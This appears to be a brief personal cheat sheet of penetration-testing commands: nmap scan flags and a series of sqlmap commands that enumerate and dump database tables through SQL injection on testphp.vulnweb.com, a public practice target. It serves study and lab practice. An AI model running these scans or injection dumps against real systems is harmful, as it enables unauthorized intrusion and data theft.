nmap 
sudo ifconfig

nmap --top-ports 20 ip (port scanning)

-O  (OS fingerprint)
-sP (Ping Scan)
-sT (tcp)
-sU localhost (udp)
-sX (xmas)

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products –-columns

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T products -C name --dump




